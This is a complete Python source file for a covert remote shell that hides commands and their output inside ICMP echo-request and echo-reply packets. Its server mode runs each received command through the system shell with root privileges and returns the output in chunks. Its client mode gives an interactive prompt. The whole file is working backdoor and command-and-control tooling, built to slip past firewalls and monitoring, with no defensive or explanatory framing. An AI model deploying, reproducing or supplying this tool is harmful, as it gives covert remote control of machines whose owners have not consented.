#!/usr/bin/env python3
"""
ICMP covert channel remote shell.

Commands travel in ICMP echo-request payloads; responses come back
in echo-reply payloads. Large responses are split into numbered chunks
so the receiver can reassemble them in order.

Requires root / CAP_NET_RAW on Linux, Administrator on Windows.

Usage:
  server:  sudo python3 icmp_shell.py server
  client:  sudo python3 icmp_shell.py client <server_ip>
"""

import argparse
import struct
import socket
import subprocess
import sys
import time

# --- Protocol constants ---------------------------------------------------

MAGIC      = b'\xDE\xAD\xBE\xEF'   # 4-byte tag to filter our packets
IDENT      = 0x4943                  # 'IC' – ICMP identifier field
TYPE_CMD   = 0x01
TYPE_RESP  = 0x02
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0
CHUNK_SIZE = 1200                    # bytes per ICMP payload chunk

# Payload wire format (after the 4-byte MAGIC):
#   msg_type  : uint8
#   seq       : uint16
#   chunk_idx : uint16   (only in TYPE_RESP)
#   chunk_tot : uint16   (only in TYPE_RESP)
#   data      : bytes

# -------------------------------------------------------------------------


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_icmp(icmp_type: int, payload: bytes, seq: int) -> bytes:
    header = struct.pack('!BBHHH', icmp_type, 0, 0, IDENT, seq)
    raw = header + payload
    csum = _checksum(raw)
    header = struct.pack('!BBHHH', icmp_type, 0, csum, IDENT, seq)
    return header + payload


def parse_icmp(raw_packet: bytes):
    """Return (icmp_type, ident, seq, payload) from a raw IP packet, or None."""
    ip_ihl = (raw_packet[0] & 0x0F) * 4
    icmp = raw_packet[ip_ihl:]
    if len(icmp) < 8:
        return None
    icmp_type, _, _, ident, seq = struct.unpack('!BBHHH', icmp[:8])
    return icmp_type, ident, seq, icmp[8:]


def encode_cmd(seq: int, cmd: bytes) -> bytes:
    return MAGIC + struct.pack('!BH', TYPE_CMD, seq) + cmd


def encode_resp_chunk(seq: int, idx: int, total: int, chunk: bytes) -> bytes:
    return MAGIC + struct.pack('!BHHH', TYPE_RESP, seq, idx, total) + chunk


def decode_payload(payload: bytes):
    """
    Returns one of:
      ('cmd',  seq, data)
      ('resp', seq, chunk_idx, chunk_total, data)
    or None if the packet isn't ours.
    """
    if len(payload) < 7 or payload[:4] != MAGIC:
        return None
    msg_type = payload[4]
    if msg_type == TYPE_CMD:
        seq, = struct.unpack('!H', payload[5:7])
        return ('cmd', seq, payload[7:])
    if msg_type == TYPE_RESP:
        if len(payload) < 11:
            return None
        seq, idx, total = struct.unpack('!HHH', payload[5:11])
        return ('resp', seq, idx, total, payload[11:])
    return None


def run_command(cmd: str) -> bytes:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=15, text=True
        )
        out = r.stdout + r.stderr
        return (out or f"(exit {r.returncode})\n").encode('utf-8', errors='replace')
    except subprocess.TimeoutExpired:
        return b"(timed out)\n"
    except Exception as e:
        return f"(error: {e})\n".encode()


# -------------------------------------------------------------------------
# Server
# -------------------------------------------------------------------------

def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '(unknown)'


def server():
    print(f"[*] Server IP: {_local_ip()}")
    print("[*] ICMP shell server — listening (Ctrl-C to stop)")
    rx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    tx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    rx.settimeout(1.0)

    while True:
        try:
            pkt, addr = rx.recvfrom(65535)
        except socket.timeout:
            continue

        parsed = parse_icmp(pkt)
        if parsed is None:
            continue
        icmp_type, ident, seq, payload = parsed

        if icmp_type != ICMP_ECHO_REQUEST or ident != IDENT:
            continue

        decoded = decode_payload(payload)
        if decoded is None or decoded[0] != 'cmd':
            continue

        _, seq, cmd_bytes = decoded
        cmd = cmd_bytes.decode('utf-8', errors='replace').strip()
        print(f"[+] {addr[0]}  seq={seq}  cmd={cmd!r}")

        output = run_command(cmd)
        chunks = [output[i:i + CHUNK_SIZE] for i in range(0, max(1, len(output)), CHUNK_SIZE)]
        total = len(chunks)

        for idx, chunk in enumerate(chunks):
            resp_payload = encode_resp_chunk(seq, idx, total, chunk)
            resp_pkt = build_icmp(ICMP_ECHO_REPLY, resp_payload, seq)
            tx.sendto(resp_pkt, (addr[0], 0))
            time.sleep(0.005)


# -------------------------------------------------------------------------
# Client
# -------------------------------------------------------------------------

def client(server_ip: str):
    print(f"[*] ICMP shell client → {server_ip}  (Ctrl-C / 'exit' to quit)")
    tx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    rx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    rx.settimeout(0.1)

    seq = 0
    while True:
        try:
            cmd = input("icmp> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Bye.")
            break

        if not cmd:
            continue
        if cmd.lower() in ('exit', 'quit'):
            break

        seq = (seq + 1) % 65536
        pkt = build_icmp(ICMP_ECHO_REQUEST, encode_cmd(seq, cmd.encode()), seq)
        tx.sendto(pkt, (server_ip, 0))

        chunks: dict[int, bytes] = {}
        total: int | None = None
        deadline = time.monotonic() + 6.0

        while time.monotonic() < deadline:
            try:
                raw, addr = rx.recvfrom(65535)
            except socket.timeout:
                if total is not None and len(chunks) == total:
                    break
                continue

            if addr[0] != server_ip:
                continue
            parsed = parse_icmp(raw)
            if parsed is None:
                continue
            icmp_type, ident, pkt_seq, payload = parsed
            if icmp_type != ICMP_ECHO_REPLY or ident != IDENT or pkt_seq != seq:
                continue
            decoded = decode_payload(payload)
            if decoded is None or decoded[0] != 'resp':
                continue

            _, r_seq, idx, tot, data = decoded
            if r_seq != seq:
                continue
            total = tot
            chunks[idx] = data
            if len(chunks) == total:
                break

        if not chunks:
            print("[!] No response received.")
            continue

        output = b''.join(chunks[i] for i in range(total or len(chunks)))
        print(output.decode('utf-8', errors='replace'), end='')


# -------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="ICMP covert shell")
    sub = ap.add_subparsers(dest='mode', required=True)
    sub.add_parser('server')
    cp = sub.add_parser('client')
    cp.add_argument('server_ip')
    args = ap.parse_args()

    try:
        if args.mode == 'server':
            server()
        else:
            client(args.server_ip)
    except PermissionError:
        sys.exit("[!] Raw sockets require root / Administrator privileges.")
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")


if __name__ == '__main__':
    main()
